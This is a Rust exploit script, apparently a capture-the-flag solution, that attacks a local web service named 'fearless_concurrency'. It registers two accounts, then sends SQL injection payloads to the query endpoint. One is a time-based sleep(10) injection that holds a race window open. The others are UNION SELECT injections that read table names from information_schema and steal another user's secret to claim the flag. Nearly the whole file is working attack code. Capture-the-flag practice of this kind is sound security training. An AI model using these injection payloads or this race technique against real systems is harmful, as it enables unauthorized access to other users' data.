use std::time::Duration;

use serde::Serialize;
use sha1::Sha1;
use sha1::Digest;


#[derive(Serialize)]
struct Query {
    user_id: u64,
    query_string: String
}

#[derive(Serialize)]
struct ClaimFlag {
    user_id: u64,
    secret: u32
}

#[tokio::main]
async fn main() {
    let target = "http://localhost:33333";
    let client = reqwest::Client::new();

    let uid1 = client.post(format!("{}/register", target))
        .send()
        .await.unwrap()
        .text()
        .await.unwrap()
        .parse::<u64>().unwrap();
    let uid1 = dbg!(uid1);


    let uid2 = client.post(format!("{}/register", target))
        .send()
        .await.unwrap()
        .text()
        .await.unwrap()
        .parse::<u64>().unwrap();
    let uid2 = dbg!(uid2);

    let mut hasher = Sha1::new();
    hasher.update(b"fearless_concurrency");
    hasher.update(uid1.to_le_bytes());
    let table_prefix = format!("tbl_{}_", hex::encode(hasher.finalize()));

    // Send request to create secret table for Uid1
    let fut = client.post(format!("{}/query", target))
    .json(&Query{
        user_id: uid1,
        query_string: "' or sleep(10);# ".to_string()
    }).send();

    tokio::spawn(fut);

    tokio::time::sleep(Duration::new(1, 0)).await;
    println!("Sending second request!");

    let table_name = client.post(format!("{}/query", target))
    .json(&Query{
        user_id: uid2,
        query_string: format!("' union select table_name from information_schema.tables where table_name like '{}%';# ", table_prefix)
    }).send().await.unwrap()
    .text().await.unwrap();
    let table_name = dbg!(table_name);

    println!("Fetching flag!");

    let secret = client.post(format!("{}/query", target))
    .json(&Query{
        user_id: uid2,
        query_string: format!("' union select secret from {};# ", table_name)
    }).send().await.unwrap()
    .text().await.unwrap()
    .parse::<u32>().unwrap();

    let secret = dbg!(secret);

    let flag = client.post(format!("{}/flag", target))
    .json(&ClaimFlag{
        user_id: uid1,
        secret
    }).send().await.unwrap()
    .text().await.unwrap();

    println!("Flag: {}", flag);
}
